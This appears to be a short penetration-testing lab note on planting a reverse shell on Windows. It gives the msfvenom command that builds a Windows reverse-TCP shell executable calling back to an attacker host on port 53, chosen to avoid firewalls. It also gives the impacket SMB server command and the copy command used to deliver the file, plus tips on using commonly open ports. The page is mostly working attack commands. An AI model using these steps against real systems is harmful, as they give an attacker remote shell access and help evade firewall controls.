# Reverse Shell

### Generate Reverse Shell Executable (on Kali)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f exe -o reverse.exe
```

We use `port-53` to try hidden from firewall and in more devices this port is already open

### Transfer reverse.exe to Windows via SMB

we choose this port because is already open on the machine

![image.png](<../../../.gitbook/assets/image (34).png>)

### Start SMB Server on Kali:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

### On Windows (CMD), copy the file:

```
copy \\10.21.218.60\kali\reverse.exe C:\PrivEsc\reverse.exe
```

**then open listener and run shell on windows**

<figure><img src="../../../.gitbook/assets/image 1 (19).png" alt=""><figcaption></figcaption></figure>

### Important Notes:

* Do **not delete** `reverse.exe` – it will be reused in other tasks.
* **Ensure no firewall blocks the connection.**
* Use a commonly open port (like 53, 443, etc.) for better reliability.
